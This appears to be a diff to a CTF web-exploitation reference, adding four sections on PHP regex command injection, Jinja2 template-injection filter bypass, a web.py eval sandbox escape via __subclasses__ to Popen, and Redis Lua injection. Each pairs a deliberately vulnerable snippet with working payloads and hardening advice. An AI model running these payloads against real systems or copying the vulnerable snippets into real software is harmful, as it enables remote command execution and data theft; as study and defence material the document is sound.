@@ -20,6 +20,10 @@
 - [Java Deserialization (ysoserial)](#java-deserialization-ysoserial) *(stub — see [server-side-deser.md](server-side-deser.md))*
 - [Python Pickle Deserialization](#python-pickle-deserialization) *(stub — see [server-side-deser.md](server-side-deser.md))*
 - [Race Conditions (Time-of-Check to Time-of-Use)](#race-conditions-time-of-check-to-time-of-use) *(stub — see [server-side-deser.md](server-side-deser.md))*
+- [Unanchored Regex Command Injection (picoCTF 2018)](#unanchored-regex-command-injection-picoctf-2018)
+- [Jinja2 SSTI via globals.__self__.exec() String Concat Bypass (InCTF 2018)](#jinja2-ssti-via-globals__self__exec-string-concat-bypass-inctf-2018)
+- [web.py reparam() eval + __subclasses__ with Blanked Builtins (HITCON 2018)](#webpy-reparam-eval--__subclasses__-with-blanked-builtins-hitcon-2018)
+- [Redis Lua Injection via redis.call() (HumanCTF 2018)](#redis-lua-injection-via-rediscall-humanctf-2018)
 
 For injection attacks (SQLi, SSTI, SSRF, XXE, command injection, PHP type juggling, PHP file inclusion), see [server-side.md](server-side.md). For deserialization attacks (Java, Pickle) and race conditions, see [server-side-deser.md](server-side-deser.md). For CVE-specific exploits, path traversal bypasses, Flask/Werkzeug debug, and other advanced techniques, see [server-side-advanced.md](server-side-advanced.md).
 
@@ -607,6 +611,103 @@ assert find_overflow_length(2) == 65536
 ```
 
 **Key insight:** Single-byte length fields overflow at 256 to 0, letting data from one field spill into subsequent fields. Any custom serialization format using fixed-width length fields is vulnerable. Look for field length stored in 1 byte (max 255) or 2 bytes (max 65535). Signs of custom serialization: binary file-based databases, custom session formats, proprietary protocol parsers. The attack requires knowing (or guessing) the exact field order and format in the serialized structure. See also [server-side-deser.md](server-side-deser.md) for standard deserialization attacks.
+
+---
+
+## Unanchored Regex Command Injection (picoCTF 2018)
+
+**Pattern:** Input validation uses `preg_match('/^<ip-pattern>/i', $ip)` — missing a trailing `$` end-of-string anchor. The match succeeds as long as the string *starts* with a valid IP, so the attacker appends a semicolon and a shell command that still reaches the later `exec("ping $ip")`.
+
+```php
+// Vulnerable
+if (preg_match('/^(\d{1,3}\.){3}\d{1,3}/', $_GET['ip'])) {
+    exec("ping -c 1 " . $_GET['ip']);
+}
+```
+
+```bash
+curl "http://target/ping.php?ip=1.1.1.1;cat%20/flag.txt"
+# matches ^1.1.1.1 then executes: ping -c 1 1.1.1.1;cat /flag.txt
+```
+
+**Key insight:** `^pattern` without `$` only fixes the prefix, not the suffix. Every form of input validation regex must anchor both ends or use `preg_match('/\A...\z/')`. When auditing, grep for `preg_match('/\^` and check that each hit also has `\$/` or `\\z/`. The same bug appears in JavaScript `String.match` and Python `re.match` (which is implicitly left-anchored but not right-anchored).
+
+**References:** picoCTF 2018 — Fancy Alive Monitoring, writeups 11706, 11721, 11761
+
+---
+
+## Jinja2 SSTI via globals.__self__.exec() String Concat Bypass (InCTF 2018)
+
+**Pattern:** Template filter blocks `__class__`, `os`, `import`, `eval`, `subprocess`, and a few other literals. Walk from any already-bound Jinja variable to `globals.__self__` (the Python builtins module) and call `exec` on a payload whose forbidden substrings are rebuilt at runtime from string concatenation.
+
+```text
+{{ globals.__self__.exec("imp" + "ort o" + "s;o" + "s.system('cat /flag')") }}
+
+# Alternative via any Python object already in context:
+{{ request.__class__.__init__.__globals__.__builtins__.exec(
+    "__imp"+"ort__('o'+'s').system('id')"
+) }}
+```
+
+**Key insight:** Any function object in Jinja's scope exposes `__globals__` (and via that, the real `builtins`). Even when `os`, `import`, and `__class__` are blacklisted, string concatenation and `chr(...)`-style tricks split the forbidden words across literal segments that the pre-render filter never sees joined. To harden, use `jinja2.sandbox.SandboxedEnvironment` instead of a string blocklist.
+
+**References:** InCTF 2018 — TorPy, writeup 11519
+
+---
+
+## web.py reparam() eval + __subclasses__ with Blanked Builtins (HITCON 2018)
+
+**Pattern:** `web.py`'s `reparam()` calls `eval(expr, {"__builtins__": object()}, context)` to interpolate `${...}` placeholders into SQL. `__builtins__` is replaced with a bare `object()` to block `__import__`, but `[].__class__.__base__.__subclasses__()` still enumerates every loaded class — including `subprocess.Popen`. An SQLi-like injection in the `limit` or `order` parameter escapes into the eval context.
+
+```python
+# web.py 0.38 sink (db.select passes limit through reparam)
+db.select('posts',
+          limit=user_input,   # interpolated via ${...} eval
+          order='ups desc')
+
+# Payload — list all subclasses to locate Popen, then call it
+user_input = (
+    "1 ${[c for c in ().__class__.__base__.__subclasses__()"
+    " if c.__name__ == 'Popen'][0](['/bin/sh','-c','cat /flag'],"
+    "stdout=-1).communicate()[0]}"
+)
+```
+
+**Key insight:** Replacing `__builtins__` with a blank object blocks `__import__`, `open`, and `eval`, but class-tree traversal still reaches any module imported before the sandbox was set up. Any Python eval that does not also replace `__builtins__` with `{"__builtins__": {}}` *and* restrict globals is bypassable via `().__class__.__base__.__subclasses__()`. Look for framework-level eval in Django templates (`{% eval %}`), web.py `reparam`, Flask Jinja with custom filters, and Mako `<%...%>` blocks.
+
+**References:** HITCON CTF 2018 — Oh My Raddit v2, writeup 11931
+
+---
+
+## Redis Lua Injection via redis.call() (HumanCTF 2018)
+
+**Pattern:** Application runs a Redis Lua script with a user-controlled argument that is concatenated into the script source instead of passed as `ARGV`. The attacker breaks out of the string literal and invokes `redis.call('GET', 'admin')` — Lua's direct Redis bridge — to read blocked keys.
+
+```lua
+-- Vulnerable script (string-concatenated)
+local script = "return redis.call('GET', '" .. user_key .. "')"
+redis.eval(script, 0)
+```
+
+```text
+# Injected parameter
+?n=123') and redis.call('get', 'admin') --
+
+# Final Lua:
+return redis.call('GET', '123') and redis.call('get', 'admin') -- ')
+```
+
+```python
+import requests
+r = requests.get("http://target/admin", params={
+    "n": "123') and redis.call('get', 'admin') --"
+})
+print(r.text)
+```
+
+**Key insight:** Redis Lua scripts expose `redis.call()` and `redis.pcall()` — they are the intended Redis bridge inside Lua, so a blocklist of Redis commands in the HTTP layer is useless once any Lua injection lands. Always pass untrusted values through `KEYS[...]` / `ARGV[...]`, never concatenate them into the script body. When Lua is unavoidable, sandbox the script with `redis-cli SCRIPT LOAD` + signed SHA1 and refuse scripts the client did not precompile.
+
+**References:** HumanCTF / HackOver 2018 — No vuln, trust me, writeup 11816
 
 ---
 
